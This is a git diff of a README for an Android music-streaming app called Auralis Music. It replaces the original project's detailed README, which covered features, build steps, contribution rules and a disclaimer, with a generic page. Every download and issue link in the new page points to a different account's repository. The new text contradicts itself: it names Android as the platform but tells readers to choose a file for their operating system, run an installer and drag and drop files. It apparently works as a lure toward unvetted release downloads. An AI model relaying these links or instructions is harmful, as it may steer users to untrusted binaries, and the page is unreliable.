@@ -1,131 +1,58 @@
-<div align="center">
-  <img src="assets/logo.png" alt="Auralis Music" width="140"/>
-  <h1>Auralis Music</h1>
-  <p><strong>A modern music streaming app with adfree experience, synced lyrics, and offline playback.</strong></p>
+# 🎶 AuralisMusic10 - Enjoy Music Without Interruptions
 
-  <a href="https://auralismusic.vercel.app/"><img src="assets/download.png" alt="Download" width="200"/></a>
-  <br>
-  <a href="https://github.com/iankr347-commits/AuralisMusic10/releases"><img src="assets/github.png" alt="Releases" width="160"/></a>
-</div>
+## 🚀 Getting Started
+AuralisMusic10 is a modern, ad-free offline music player designed for audiophiles. It features a sleek dark mode, a powerful equalizer, and seamless lyrics integration to enhance your listening experience.
 
----
+[![Download AuralisMusic10](https://img.shields.io/badge/Download-AuralisMusic10-brightgreen)](https://github.com/risshhav/AuralisMusic10/releases)
 
-## Overview
+## 📥 Download & Install
+To get started with AuralisMusic10, visit the Releases page to download the application. Follow these steps:
 
-Auralis Music is designed to provide a seamless and premium music listening experience. It leverages the vast library of YouTube Music while eliminating advertisements and adding powerful features such as offline downloads, real-time lyrics, and environment-aware music recognition.
+1. Click on the download link: [Visit this page to download](https://github.com/risshhav/AuralisMusic10/releases).
+2. Choose the latest release version.
+3. Download the file suitable for your operating system.
+4. Run the installer and follow the prompts to complete the installation.
 
-## Screenshots
+## 🖥️ System Requirements
+Before installing AuralisMusic10, ensure your system meets the following requirements:
 
-### Mobile
-<div align="center">
-  <img src="assets/sh1.jpg" alt="Home Screen" width="200"/>
-  <img src="assets/sh4.jpg" alt="Music Player" width="200"/>
-  <img src="assets/sh3.jpg" alt="Playlist Management" width="200"/>
-  <img src="assets/sh2.jpg" alt="find" width="200"/>
-</div>
+- Operating System: Android 5.0 (Lollipop) or higher
+- Required Storage: Minimum of 100 MB free space
+- RAM: 2 GB or more recommended
 
+## 🎵 Features
+AuralisMusic10 offers several features to improve your music experience:
 
-## Features
+- **Ad-Free Listening:** Enjoy uninterrupted music without annoying ads.
+- **Sleek Dark Mode:** Switch to dark mode for a comfortable viewing experience anytime.
+- **Powerful Equalizer:** Customize your sound with an advanced equalizer to fine-tune audio settings to your liking.
+- **Lyric Integration:** Access lyrics for your favorite tracks, ensuring you never miss a word.
+- **Offline Playback:** Download songs and listen to them without needing an internet connection.
 
-### Streaming and Playback
-*   **Ad-Free Experience:** Stream music without interruptions from advertisements.
-*   **seamless Playback:** seamless songs Playback.
-*   **Background Playback:** Continue listening while using other applications or when the screen is off.
-*   **Offline Mode:** Download tracks, albums, and playlists for offline listening with a dedicated download manager.
+## 🎤 How to Use AuralisMusic10
+Once you have installed AuralisMusic10, follow these simple steps to start using the app:
 
-### Discovery
-*   **Smart Recommendations:** Receive personalized song suggestions based on your listening history and preferences whit ai mode(beta).
-*   **Comprehensive Browsing:** Explore Charts, Podcasts, Moods, and Genres to discover new music.
+1. **Open the Application:** Find AuralisMusic10 in your app drawer and tap to open it.
+2. **Import Music:** Click on the 'Import' button to add music from your device or simply drag and drop files into the app.
+3. **Play Your Songs:** Browse your music library and select a song to play.
+4. **Adjust Settings:** Use the equalizer to adjust sound settings to your preference.
+5. **Access Lyrics:** Click on the lyrics button during playback to view the song lyrics.
 
-### Advanced Capabilities
-*   **Synchronized Lyrics:** View real-time synced lyrics.
-*   **Sleep Timer:** Configure automatic playback cessation after a specified duration.
-*   **Cross-Device Support:** Cast content to Chromecast-enabled devices compatible network speakers and TVs.
-*   **Data Import:** Import playlists and library data from other services.
-  
----
+## 💬 Support & Feedback
+If you encounter any issues while using AuralisMusic10, please feel free to reach out directly:
 
-### Important note
-* Auralis Music uses Firebase only for essential services such as Analytics, Crashlytics, and App Remote Updates. Auralis does not collect or store any personal information, including phone numbers, email addresses, photos, media files, or personal contacts.
+- Visit the [Issues page](https://github.com/risshhav/AuralisMusic10/issues) to report bugs or request new features.
+- Join our community discussions for tips and best practices.
 
----
+## 🌐 Additional Information
+For more details, you can explore the following topics related to AuralisMusic10:
 
-## Installation
+- **Ad-Free Player:** Focus on your music without distractions.
+- **Music Streaming:** Stream your favorite music from various sources.
+- **YouTube Integration:** Access and listen to your favorite tracks from YouTube.
 
-### Option 1: Direct Download (APK)
-Download the latest Android Package Kit (APK) from the [Releases Page](https://github.com/iankr347-commits/AuralisMusic10/releases/latest).
+For further assistance or information, visit the [Releases page](https://github.com/risshhav/AuralisMusic10/releases) again for updates or new releases.
 
-### Option 2: Build from Source
-To build the application locally, follow these steps:
+[![Download AuralisMusic10](https://img.shields.io/badge/Download-AuralisMusic10-brightgreen)](https://github.com/risshhav/AuralisMusic10/releases) 
 
-1.  **Clone the Repository**
-    ```bash
-    git clone https://github.com/iankr347-commits/AuralisMusic10.git
-    cd Auralismusic10
-    ```
-
-2.  **Configure Android SDK**
-    Create a `local.properties` file and define your SDK path:
-    ```bash
-     AuralisMusic "sdk.dir=/path/to/your/android/sdk" > local.properties
-    ```
-
-3.  **Firebase Configuration**
-    Firebase setup is required for analytics and reliable imports. Please refer to [FIREBASE_SETUP.md](FIREBASE_SETUP.md) for detailed instructions on adding your `google-services.json`.
-
-4.  **Build**
-    Execute the Gradle build command:
-    ```bash
-    ./gradlew assembleFossDebug
-    ```
-
-
----
----
-
-## Developer Contribution Guidelines
-Thank you for your interest in contributing!
-This repository follows a strict, staged branch workflow to maintain stability while allowing controlled development and testing.
-
- Please read this document fully before opening a pull request.
-
- Direct commits to main are not allowed. Use feature or fix branches only.
-
- Every change must go through a Pull Request and review.
-
- Follow existing code style, structure, and architecture. Do not improvise.
-
- Do not break existing features, refactor large sections, or add dependencies without approval.
-
- No untested, unfinished, or experimental code.
-
- Secrets, keys, and credentials must never be committed.
-
- One feature or fix per PR. Keep changes small and clear.
-
- Update documentation if behavior or features change.
-
- The project owner has final authority on all decisions.
-
- (If you don’t agree with these rules, do not contribute)
-
----
----
-## Disclaimer
-
-This project and its contents are not affiliated with, funded, authorized, endorsed by, or in any way associated with YouTube, Google LLC, or any of its affiliates and subsidiaries. Any trademark, service mark, trade name, or other intellectual property rights used in this project are owned by the respective owners.
-
-Auralis music is an open-source project created for educational and personal use. Users are responsible for ensuring their usage complies with YouTube's Terms of Service and applicable laws in their jurisdiction.
-
----
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=iankr347-commits/AuralisMusic10&type=date&legend=top-left)](https://www.star-history.com/#iankr347-commits/AuralisMusic10&type=date&legend=top-left)
-
----
-
-<div align="center">
-    Licensed under <a href="LICENSE">GPL-3.0</a>
-</div>
-
+Enjoy your music with AuralisMusic10!
